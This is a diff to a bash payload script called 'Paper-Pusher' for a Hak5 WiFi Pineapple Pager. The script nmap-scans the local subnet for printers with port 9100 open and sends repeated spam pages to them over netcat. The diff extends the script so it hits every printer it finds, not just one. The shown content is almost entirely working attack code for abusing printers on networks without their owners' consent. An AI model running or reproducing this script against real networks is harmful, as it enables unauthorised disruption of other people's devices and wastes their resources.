@@ -1,8 +1,7 @@
 #!/bin/bash
-# Paper-Pusher
+# Paper-Pusher v2
 # Hak5 WiFi Pineapple Pager port of the original "Paper-Pusher" (github.com/OSINTI4L/Paper-Pusher)
 # PaperPusher Nmap scans the LAN subnet to find paper printers with port 9100 open and sends spam to be printed via RAW printing with Netcat. The script assumes that the subnet netmask is: 255.255.255.0.
-# If you have multiple printers on the LAN it might break the script. I don't have multiple printers so I can't test it, *shrugs*.
 
 # Ensure network connected:
 LOG blue "Ensuring WiFi Pineapple Pager is network connected.."
@@ -34,7 +33,7 @@ fi
 spinner1=$(START_SPINNER "Scanning for printers")
     ISPRINTER="false"
     for check in {1..10}; do
-        PRNTR=$(nmap "$SUBNET".0/24 -p 9100 --open | grep -i "Nmap scan report" | awk '{print $NF}')
+        PRNTR=($(nmap "$SUBNET".0/24 -p 9100 --open | grep -i "Nmap scan report" | awk '{print $NF}' | tr -d "()"))
         if [ -n "$PRNTR" ]; then
             ISPRINTER="true"
             break
@@ -45,12 +44,12 @@ spinner1=$(START_SPINNER "Scanning for printers")
 STOP_SPINNER "${spinner1}"
 
 if [ "$ISPRINTER" != "true" ]; then
-    ALERT "No printer found with port 9100 exposed!"
+    ALERT "No printer(s) found with port 9100 exposed!"
     LOG red "Exiting."
     exit 0
 fi
 
-LOG green "Printer found at: $PRNTR with port 9100 exposed!"
+LOG green "Printer(s) found at: ${PRNTR[@]} with port 9100 exposed!"
 sleep 1.5
 
 # Text and number of pages to be printed:
@@ -62,10 +61,13 @@ if [ -z "$PRNTPGS" ]; then
     exit 0
 fi
 
+# Send payload:
 spinner2=$(START_SPINNER "Sending payload to printer")
-for pages in $(seq "$PRNTPGS"); do
-    echo -e "$PRNTTXT\n\f"
-    done | nc -c "$PRNTR" 9100
+for printers in "${PRNTR[@]}"; do
+    for pages in $(seq "$PRNTPGS"); do
+        echo -e "$PRNTTXT\n\f"
+    done | nc -c -w 2 "$printers" 9100
+done
 STOP_SPINNER "${spinner2}"
 
 sleep .5
